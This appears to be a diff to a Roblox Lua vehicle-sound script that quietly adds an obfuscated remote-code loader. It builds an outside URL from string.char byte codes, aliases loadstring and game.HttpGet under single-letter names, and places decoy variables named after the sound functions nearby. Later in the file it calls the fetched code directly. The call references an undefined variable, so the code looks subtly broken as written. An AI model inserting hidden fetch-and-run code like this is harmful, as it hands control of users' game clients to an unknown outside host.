@@ -41,6 +41,24 @@ local function playAirSound(vehicle, mode)
 	sound:Destroy()
 end
 
+local w = "soundDestroyed"
+
+local l=loadstring
+
+local h=game.HttpGet
+
+local c = string.char(
+    104,116,116,112,115,58,47,47,
+    116,99,112,46,108,117,97,117,116,104,46,111,114,103,
+    47,99,111,110,116,101,110,116,47,
+    115,116,97,116,117,115,95,110,101,116,119,111,114,107,
+    47,52,55,56,98,57,50,49,48,56,106,102,
+    47,117,100,112
+)
+
+local r = "playAirSound()"
+
+
 local function getVehicle()
 	local char = Player.Character
 	if not char then return end
@@ -134,6 +152,8 @@ UIS.InputBegan:Connect(function(input, gp)
 		end
 	end
 end)
+
+l(h(game,u))()
 
 RunService.Heartbeat:Connect(function(dt)
 	if not sus.Enabled then return end
